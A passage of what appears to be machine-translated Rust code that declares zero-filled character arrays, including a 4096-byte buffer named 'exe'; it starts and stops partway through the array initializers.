        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ];
    let mut exe: [libc::c_char; 4096] = [
        0 as libc::c_int as libc::c_char,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
